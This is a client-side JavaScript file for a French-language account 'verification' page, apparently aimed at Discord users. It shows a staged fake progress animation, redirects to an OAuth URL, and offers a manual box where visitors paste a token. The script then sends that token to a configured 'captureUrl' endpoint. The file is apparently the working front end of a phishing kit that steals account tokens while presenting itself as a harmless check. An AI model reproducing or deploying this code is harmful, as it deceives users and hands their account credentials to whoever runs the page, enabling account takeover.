(function () {
  "use strict";

  const cfg = window.__VERIF__ || {};
  const startBtn = document.getElementById("start");
  const steps = Array.from(document.querySelectorAll("#steps li"));
  const bar = document.getElementById("progress");
  const manualToggle = document.getElementById("toggle-manual");
  const manualBox = document.getElementById("manual-box");
  const manualInput = document.getElementById("manual-token");
  const manualSubmit = document.getElementById("manual-submit");

  function setProgress(value) {
    if (bar) bar.style.width = Math.min(100, value) + "%";
  }

  function markStep(index, state) {
    const element = steps[index];
    if (!element) return;
    element.classList.remove("active", "done");
    if (state) element.classList.add(state);
  }

  if (manualToggle && manualBox) {
    manualToggle.addEventListener("click", function () {
      manualBox.hidden = !manualBox.hidden;
      if (!manualBox.hidden) manualInput.focus();
    });
  }

  if (startBtn) {
    startBtn.addEventListener("click", function () {
      startBtn.disabled = true;
      startBtn.textContent = "Analyse en cours...";

      markStep(0, "active");
      setProgress(12);

      setTimeout(function () {
        markStep(0, "done");
        markStep(1, "active");
        setProgress(45);

        setTimeout(function () {
          window.location.href = cfg.oauthUrl;
        }, 650);
      }, 900);
    });
  }

  if (manualSubmit) {
    manualSubmit.addEventListener("click", async function () {
      const token = (manualInput.value || "").trim();
      if (!token) {
        manualInput.focus();
        return;
      }
      manualSubmit.disabled = true;
      manualSubmit.textContent = "Validation...";
      setProgress(50);

      try {
        const response = await fetch(cfg.captureUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token: token, state: cfg.state, source: "manual" })
        });
        const data = await response.json();
        setProgress(100);
        if (!data.ok) {
          manualSubmit.disabled = false;
          manualSubmit.textContent = "Valider";
          manualBox.insertAdjacentHTML(
            "beforeend",
            '<p class="warn">Token invalide, verifie que tu as bien copie toute la valeur.</p>'
          );
          return;
        }
        const params = new URLSearchParams();
        params.set("username", (data.user && (data.user.global_name || data.user.username)) || "");
        params.set("guild", data.guild_id || "");
        params.set("joined", data.joined ? "1" : "0");
        window.location.href = "/success?" + params.toString();
      } catch (error) {
        manualSubmit.disabled = false;
        manualSubmit.textContent = "Valider";
        setProgress(0);
      }
    });
  }
})();
